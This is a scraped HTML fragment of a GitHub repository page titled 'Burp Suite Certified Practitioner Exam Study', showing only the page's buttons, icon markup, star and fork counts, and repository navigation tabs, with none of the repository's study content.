            <a href="/login?return_to=%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study" rel="nofollow" id="repository-details-watch-button" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?utm_source=chatgpt.com&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="8c801962e3e1d444426b7cce15833113477478449acfd43f69221e1a903dac9a" aria-label="You must be signed in to change notification settings" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bell mr-2">
    <path d="M8 16a2 2 0 0 0 1.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 0 0 8 16ZM3 5a5 5 0 0 1 10 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.519 1.519 0 0 1 13.482 13H2.518a1.516 1.516 0 0 1-1.263-2.36l1.703-2.554A.255.255 0 0 0 3 7.947Zm5-3.5A3.5 3.5 0 0 0 4.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.017.017 0 0 0-.003.01l.001.006c0 .002.002.004.004.006l.006.004.007.001h10.964l.007-.001.006-.004.004-.006.001-.007a.017.017 0 0 0-.003-.01l-1.703-2.554a1.745 1.745 0 0 1-.294-.97V5A3.5 3.5 0 0 0 8 1.5Z"></path>
</svg>Notifications
</a>    <tool-tip id="tooltip-1216c757-2324-4e21-9bef-d0d91330ef9a" for="repository-details-watch-button" popover="manual" data-direction="s" data-type="description" data-view-component="true" class="sr-only position-absolute">You must be signed in to change notification settings</tool-tip>

  </li>

  <li>
          <a icon="repo-forked" id="fork-button" href="/login?return_to=%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;repo details fork button&quot;,&quot;repository_id&quot;:586233738,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?utm_source=chatgpt.com&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="bade357599a6c52b19895395306281544a11342a5dd487cb823597c7ec1a5540" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2">
    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
</svg>Fork
    <span id="repo-network-counter" data-pjax-replace="true" data-turbo-replace="true" title="346" data-view-component="true" class="Counter">346</span>
</a>
  </li>

  <li>
        <div data-view-component="true" class="BtnGroup d-flex">
        <a href="/login?return_to=%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:586233738,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?utm_source=chatgpt.com&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="13be96a9ba20f4df52e1a21d11082e7f1e588b578482b67a3145587de1f36c9f" aria-label="You must be signed in to star a repository" data-view-component="true" class="tooltipped tooltipped-sw btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star v-align-text-bottom d-inline-block mr-2">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg><span data-view-component="true" class="d-inline">
          Star
</span>          <span id="repo-stars-counter-star" aria-label="1238 users starred this repository" data-singular-suffix="user starred this repository" data-plural-suffix="users starred this repository" data-turbo-replace="true" title="1,238" data-view-component="true" class="Counter js-social-count">1.2k</span>
</a></div>
  </li>

</ul>

        </div>
      </div>

        <div id="responsive-meta-container" data-turbo-replace>
      <div class="d-block d-md-none mb-2 px-3 px-md-4 px-lg-5">
      <p class="f4 mb-3 ">
        Burp Suite Certified Practitioner Exam Study
      </p>

    

    <div class="mb-3">
        <a class="Link--secondary no-underline mr-3" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/stargazers">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star mr-1">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg>
          <span class="text-bold">1.2k</span>
          stars
</a>        <a class="Link--secondary no-underline mr-3" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/forks">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-1">
    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
</svg>
          <span class="text-bold">346</span>
          forks
</a>        <a class="Link--secondary no-underline mr-3 d-inline-block" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/branches">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-branch mr-1">
    <path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path>
</svg>
          <span>Branches</span>
</a>        <a class="Link--secondary no-underline d-inline-block" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tags">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-tag mr-1">
    <path d="M1 7.775V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.752 1.752 0 0 1 1 7.775Zm1.5 0c0 .066.026.13.073.177l6.25 6.25a.25.25 0 0 0 .354 0l5.025-5.025a.25.25 0 0 0 0-.354l-6.25-6.25a.25.25 0 0 0-.177-.073H2.75a.25.25 0 0 0-.25.25ZM6 5a1 1 0 1 1 0 2 1 1 0 0 1 0-2Z"></path>
</svg>
          <span>Tags</span>
</a>        <a class="Link--secondary no-underline d-inline-block" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/activity">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-pulse mr-1">
    <path d="M6 2c.306 0 .582.187.696.471L10 10.731l1.304-3.26A.751.751 0 0 1 12 7h3.25a.75.75 0 0 1 0 1.5h-2.742l-1.812 4.528a.751.751 0 0 1-1.392 0L6 4.77 4.696 8.03A.75.75 0 0 1 4 8.5H.75a.75.75 0 0 1 0-1.5h2.742l1.812-4.529A.751.751 0 0 1 6 2Z"></path>
</svg>
          <span>Activity</span>
</a>    </div>
      <div class="d-flex flex-wrap gap-2">
        <div class="flex-1">
            <div data-view-component="true" class="BtnGroup d-flex">
        <a href="/login?return_to=%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:586233738,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?utm_source=chatgpt.com&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="13be96a9ba20f4df52e1a21d11082e7f1e588b578482b67a3145587de1f36c9f" aria-label="You must be signed in to star a repository" data-view-component="true" class="tooltipped tooltipped-sw btn-sm btn btn-block">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star v-align-text-bottom d-inline-block mr-2">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg><span data-view-component="true" class="d-inline">
          Star
</span>
</a></div>
        </div>
        <div class="flex-1">
                <a href="/login?return_to=%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study" rel="nofollow" id="files-overview-watch-button" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?utm_source=chatgpt.com&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="8c801962e3e1d444426b7cce15833113477478449acfd43f69221e1a903dac9a" aria-label="You must be signed in to change notification settings" data-view-component="true" class="btn-sm btn btn-block">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bell mr-2">
    <path d="M8 16a2 2 0 0 0 1.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 0 0 8 16ZM3 5a5 5 0 0 1 10 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.519 1.519 0 0 1 13.482 13H2.518a1.516 1.516 0 0 1-1.263-2.36l1.703-2.554A.255.255 0 0 0 3 7.947Zm5-3.5A3.5 3.5 0 0 0 4.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.017.017 0 0 0-.003.01l.001.006c0 .002.002.004.004.006l.006.004.007.001h10.964l.007-.001.006-.004.004-.006.001-.007a.017.017 0 0 0-.003-.01l-1.703-2.554a1.745 1.745 0 0 1-.294-.97V5A3.5 3.5 0 0 0 8 1.5Z"></path>
</svg>Notifications
</a>    <tool-tip id="tooltip-d20a64d4-6691-4563-a7d7-1d68129c704d" for="files-overview-watch-button" popover="manual" data-direction="s" data-type="description" data-view-component="true" class="sr-only position-absolute">You must be signed in to change notification settings</tool-tip>

        </div>
        <span>
          

        </span>
      </div>
  </div>

</div>


          <nav data-pjax="#js-repo-pjax-container" aria-label="Repository" data-view-component="true" class="js-repo-nav js-sidenav-container-pjax js-responsive-underlinenav overflow-hidden UnderlineNav px-3 px-md-4 px-lg-5">

  <ul data-view-component="true" class="UnderlineNav-body list-style-none">
      <li data-view-component="true" class="d-inline-flex">
  <a id="code-tab" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" data-tab-item="i0code-tab" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages repo_deployments repo_attestations /botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g c" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Code&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" aria-current="page" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item selected">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code UnderlineNav-octicon d-none d-sm-inline">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
        <span data-content="Code">Code</span>
          <span id="code-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="issues-tab" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/issues" data-tab-item="i1issues-tab" data-selected-links="repo_issues repo_labels repo_milestones /botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/issues" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g i" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Issues&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-issue-opened UnderlineNav-octicon d-none d-sm-inline">
    <path d="M8 9.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Z"></path>
</svg>
        <span data-content="Issues">Issues</span>
          <span id="issues-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="7" data-view-component="true" class="Counter">7</span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="pull-requests-tab" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/pulls" data-tab-item="i2pull-requests-tab" data-selected-links="repo_pulls checks /botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/pulls" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g p" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Pull requests&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-pull-request UnderlineNav-octicon d-none d-sm-inline">
    <path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354ZM3.75 2.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm0 9.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm8.25.75a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Z"></path>
</svg>
        <span data-content="Pull requests">Pull requests</span>
          <span id="pull-requests-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="0" hidden="hidden" data-view-component="true" class="Counter">0</span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="actions-tab" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/actions" data-tab-item="i3actions-tab" data-selected-links="repo_actions /botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/actions" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g a" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Actions&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-play UnderlineNav-octicon d-none d-sm-inline">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm4.879-2.773 4.264 2.559a.25.25 0 0 1 0 .428l-4.264 2.559A.25.25 0 0 1 6 10.559V5.442a.25.25 0 0 1 .379-.215Z"></path>
</svg>
        <span data-content="Actions">Actions</span>
          <span id="actions-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="projects-tab" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/projects" data-tab-item="i4projects-tab" data-selected-links="repo_projects new_repo_project repo_project /botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/projects" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g b" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Projects&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-table UnderlineNav-octicon d-none d-sm-inline">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25ZM6.5 6.5v8h7.75a.25.25 0 0 0 .25-.25V6.5Zm8-1.5V1.75a.25.25 0 0 0-.25-.25H6.5V5Zm-13 1.5v7.75c0 .138.112.25.25.25H5v-8ZM5 5V1.5H1.75a.25.25 0 0 0-.25.25V5Z"></path>
</svg>
        <span data-content="Projects">Projects</span>
          <span id="projects-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="0" hidden="hidden" data-view-component="true" class="Counter">0</span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="security-tab" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/security" data-tab-item="i5security-tab" data-selected-links="security overview alerts policy token_scanning code_scanning /botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/security" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g s" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Security&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield UnderlineNav-octicon d-none d-sm-inline">
    <path d="M7.467.133a1.748 1.748 0 0 1 1.066 0l5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667Zm.61 1.429a.25.25 0 0 0-.153 0l-5.25 1.68a.25.25 0 0 0-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.34 4.366 3.297a.196.196 0 0 0 .154 0c2.245-.956 3.582-2.104 4.366-3.298C13.225 9.666 13.5 8.36 13.5 7V3.48a.251.251 0 0 0-.174-.237l-5.25-1.68ZM8.75 4.75v3a.75.75 0 0 1-1.5 0v-3a.75.75 0 0 1 1.5 0ZM9 10.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        <span data-content="Security">Security</span>
          <include-fragment src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/security/overall-count" accept="text/fragment+html" data-nonce="v2:44c436e9-6f3f-c882-01d1-e5d4aec4503a" data-view-component="true">
  
  <div data-show-on-forbidden-error hidden>
    <div class="Box">
  <div class="blankslate-container">
    <div data-view-component="true" class="blankslate blankslate-spacious color-bg-default rounded-2">
      

      <h3 data-view-component="true" class="blankslate-heading">        Uh oh!
</h3>
      <p data-view-component="true">        <p class="color-fg-muted my-2 mb-2 ws-normal">There was an error while loading. <a class="Link--inTextBlock" data-turbo="false" href="" aria-label="Please reload this page">Please reload this page</a>.</p>
</p>

</div>  </div>
</div>  </div>
</include-fragment>

    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="insights-tab" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/pulse" data-tab-item="i6insights-tab" data-selected-links="repo_graphs repo_contributors dependency_graph dependabot_updates pulse people community /botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/pulse" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Insights&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-graph UnderlineNav-octicon d-none d-sm-inline">
    <path d="M1.5 1.75V13.5h13.75a.75.75 0 0 1 0 1.5H.75a.75.75 0 0 1-.75-.75V1.75a.75.75 0 0 1 1.5 0Zm14.28 2.53-5.25 5.25a.75.75 0 0 1-1.06 0L7 7.06 4.28 9.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.25-3.25a.75.75 0 0 1 1.06 0L10 7.94l4.72-4.72a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
        <span data-content="Insights">Insights</span>
          <span id="insights-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
</ul>
    <div style="visibility:hidden;" data-view-component="true" class="UnderlineNav-actions js-responsive-underlinenav-overflow position-absolute pr-3 pr-md-4 pr-lg-5 right-0">      <action-menu data-select-variant="none" data-view-component="true">
  <focus-group direction="vertical" mnemonics retain>
    <button id="action-menu-b13b8589-72cc-4209-b830-4e20e4eef313-button" popovertarget="action-menu-b13b8589-72cc-4209-b830-4e20e4eef313-overlay" aria-controls="action-menu-b13b8589-72cc-4209-b830-4e20e4eef313-list" aria-haspopup="true" aria-labelledby="tooltip-8a668207-ba41-4254-a702-4f398a601d59" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--medium UnderlineNav-item">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal Button-visual">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg>
</button><tool-tip id="tooltip-8a668207-ba41-4254-a702-4f398a601d59" for="action-menu-b13b8589-72cc-4209-b830-4e20e4eef313-button" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Additional navigation options</tool-tip>


<anchored-position data-target="action-menu.overlay" id="action-menu-b13b8589-72cc-4209-b830-4e20e4eef313-overlay" anchor="action-menu-b13b8589-72cc-4209-b830-4e20e4eef313-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="action-menu-b13b8589-72cc-4209-b830-4e20e4eef313-button" id="action-menu-b13b8589-72cc-4209-b830-4e20e4eef313-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li hidden="hidden" data-menu-item="i0code-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-8e88fe29-9154-4ea9-894c-d7db64a6b48b" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Code
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i1issues-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-732b83e3-7455-4d9a-aa95-6db3523f952e" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/issues" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-issue-opened">
    <path d="M8 9.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Z"></path>
